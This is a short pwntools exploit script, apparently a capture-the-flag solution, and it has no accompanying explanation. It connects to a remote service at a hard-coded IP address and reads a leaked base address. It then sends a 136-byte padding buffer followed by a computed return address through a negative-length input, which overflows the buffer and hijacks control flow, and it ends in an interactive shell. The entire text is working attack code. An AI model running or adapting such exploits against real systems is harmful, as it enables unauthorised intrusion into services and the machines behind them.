from pwn import *


p = remote("35.198.185.193", 1338)
context.log_level='debug'
got = 0x9D3
pay = "A"*136

p.recvuntil("> ")
p.sendline("modinfo")
p.recvuntil("Base address: ")

addr = int(p.recv(14),16)
print "0x%x" % addr

pay += p64(addr + got)

p.sendline('wrap')
p.recvuntil(' |> ')
p.sendline('-1')
p.recvuntil(' |> ')
p.sendline(pay)
p.recvuntil("Wow! This looks so beautiful")
p.interactive()
